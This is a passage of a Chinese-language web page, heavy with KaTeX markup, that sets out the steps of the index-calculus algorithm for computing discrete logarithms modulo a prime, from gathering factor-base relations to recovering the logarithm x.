<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令</mtext><msup><mi>α</mi><mi>k</mi></msup><mtext>为</mtext><mi>S</mi><mtext>中元的乘积：</mtext><msup><mi>α</mi><mi>k</mi></msup><mo>≡</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>c</mi><mi>i</mi></msub></msubsup><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi><mo separator="true">,</mo><mspace width="1em"/><msub><mi>c</mi><mi>i</mi></msub><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">令\alpha^k为S中元的乘积： \alpha^k \equiv \prod_{i=1}^{t}p_i^{c_i}modP, \quad c_i \geq0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">令</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.05823em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7805610000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>i</mi><mi>f</mi><mspace width="1em"/><mi>s</mi><mi>u</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>e</mi><mi>d</mi><mo>:</mo><mspace width="1em"/><mtext>上式取对数得到一个线性关系：</mtext><mspace width="1em"/><mi>k</mi><mo>≡</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><msub><mi>P</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>P</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">if \quad succeed:\quad上式取对数得到一个线性关系：\quad k \equiv \sum _{i=1}^{t}log_\alpha P_i mod(P-1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">：</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.05823em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7805610000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
</li>
<li>
<p>重复 1and2 直到得到 t+c 个关系</p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>找出</mtext><mi>S</mi><mtext>上元的离散对数，在模</mtext><mi>p</mi><mo>−</mo><mn>1</mn><mtext>意义下，解在第</mtext><mn>2</mn><mtext>步中收集到的</mtext><mi>t</mi><mo>+</mo><mi>c</mi><mtext>个线性方程的线性系统得到所有值</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><mspace width="1em"/><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">找出S上元的离散对数，在模p-1意义下，解在第2步中收集到的t+c个线性方程的线性系统得到所有值log_\alpha P_i,\quad 1 \leq i \leq t
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">出</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">第</span><span class="mord">2</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">c</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">值</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span></span></p>
</li>
<li>
<p>计算 x</p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>选择一个随机整数</mtext><mi>k</mi><mtext>，</mtext><mn>0</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>计算</mtext><mi>β</mi><mo separator="true">⋅</mo><msup><mi>α</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">选择一个随机整数k，0\leq k\leq n-1,计算\beta ·\alpha ^k
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></p>
</li>
<li>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令</mtext><mi>β</mi><mo separator="true">⋅</mo><msup><mi>α</mi><mi>k</mi></msup><mtext>为</mtext><mi>S</mi><mtext>中元的乘积：</mtext><mi>β</mi><mo separator="true">⋅</mo><msup><mi>α</mi><mi>k</mi></msup><mo>≡</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>d</mi><mi>i</mi></msub></msubsup><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi><mo separator="true">,</mo><mspace width="1em"/><msub><mi>d</mi><mi>i</mi></msub><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">令\beta ·\alpha ^k为S中元的乘积： \beta ·\alpha ^k \equiv \prod_{i=1}^{t}p_i^{d_i}modP, \quad d_i \geq0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.05823em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7805610000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9310079999999998em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.27686399999999994em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>如果不成功则重复第</mtext><mn>6</mn><mtext>步，否则，方程两边取对数：</mtext><mspace width="1em"/><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><mi>β</mi><mo>=</mo><mo stretchy="false">[</mo><mo stretchy="false">(</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><msub><mi>P</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mi>k</mi><mo stretchy="false">]</mo><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi><mspace width="1em"/><mi>R</mi><mi>e</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">如果不成功则重复第6步，否则，方程两边取对数： \quad log_\alpha \beta=[(\sum_{i=1}^{t}log_\alpha P_i)-k]mod(p-1)=x \quad Return(x)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">功</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">第</span><span class="mord">6</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.05823em;vertical-align:-1.277669em;"></span><span class="mopen">[</span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7805610000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">n</span><span 